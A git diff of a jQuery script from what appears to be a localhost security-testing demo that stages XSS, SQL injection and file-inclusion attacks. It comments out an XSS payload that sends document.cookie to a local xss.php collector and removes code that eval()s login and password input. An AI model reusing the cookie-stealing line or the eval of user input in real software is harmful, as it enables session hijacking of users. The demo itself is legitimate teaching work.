@@ -13,14 +13,16 @@ $(document).ready(function(){
         $(this).next(".radio-group").slideToggle();
     });
 
-    /* XSS Attack - Put malicious JS in login input */
+    /* XSS Attack - Put malicious JS in login input 
     $('input[type=radio][name=attack]').change(function() {
         switch(this.value){
             case 'xss-attack' :
                 $("#loginWithoutSecurity").val("window.open(\"http://127.0.0.1/securitytesting/xssattack/xss.php?c=\"+document.cookie);");
                 break;
         }
-    });
+    });*/
+
+/* window.location="http://127.0.0.1/securitytesting/xssattack/xss.php?c="+document.cookie; */
     
     $('#cb-dic').change(function() {
         if($(this).is(":checked")){
@@ -81,6 +83,10 @@ $(document).ready(function(){
 });
 
 function submitCheck(){
+    if($("#rb-include").is(":checked")){
+        window.location = "http://127.0.0.1/securitytesting/?includeattack=1";
+    }
+
     if($("#submitWithoutSecurity").hasClass("disabled"))
         return false;
     
@@ -125,20 +131,6 @@ function submitCheck(){
         if($("#cb-sql").is(':checked')){
             prevent_sql = "yes";
         }
-
-        if($("#rb-xss").is(":checked") && !$("#cb-xss").is(':checked')){
-            try {
-                eval(login);
-            } catch (err) {
-                console.log("message : " + err + " and is not a javascript function");
-            }
-
-            try {
-                eval(pass);
-            } catch (err) {
-                console.log("message : " + err + " and is not a javascript function");
-            }
-        }
         
         var dataString = 'login='+ login + '&pass='+ pass + '&sql='+ prevent_sql;
         if(login == '' || pass == '')
@@ -148,9 +140,6 @@ function submitCheck(){
         }
         else
         {
-            if($("#rb-include").is(":checked")){
-                window.location = "http://127.0.0.1/securitytesting/?includeattack=1";
-            }
             return true;
         }
     }				
